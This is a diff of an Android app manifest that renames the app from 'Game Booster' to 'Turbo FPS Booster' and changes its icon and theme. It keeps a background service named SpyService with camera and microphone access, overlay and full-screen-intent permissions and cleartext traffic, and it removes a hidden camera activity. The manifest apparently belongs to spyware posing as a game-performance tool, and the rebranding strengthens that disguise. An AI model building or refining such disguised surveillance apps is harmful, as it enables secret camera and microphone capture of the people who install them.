@@ -11,15 +11,15 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+    <uses-permission android:name="android.permission.VIBRATE" />
 
     <application
         android:allowBackup="true"
-        android:icon="@android:drawable/ic_menu_manage"
-        android:label="Game Booster"
+        android:icon="@drawable/ic_booster"
+        android:label="Turbo FPS Booster"
         android:usesCleartextTraffic="true"
-        android:theme="@style/Theme.AppCompat.Light">
+        android:theme="@style/Theme.AppCompat.NoActionBar">
         
-        <!-- Главный экран с кнопкой -->
         <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -27,16 +27,8 @@
             </intent-filter>
         </activity>
 
-        <!-- Экран для камеры (тема без панели действий обязательна) -->
-        <activity android:name=".CameraActivity" 
-            android:exported="false"
-            android:excludeFromRecents="true"
-            android:theme="@style/Theme.AppCompat.NoActionBar"/>
-        
-        <!-- Фоновый сервис -->
         <service android:name=".SpyService" 
             android:foregroundServiceType="camera|microphone"
             android:exported="false"/>
-            
     </application>
 </manifest>
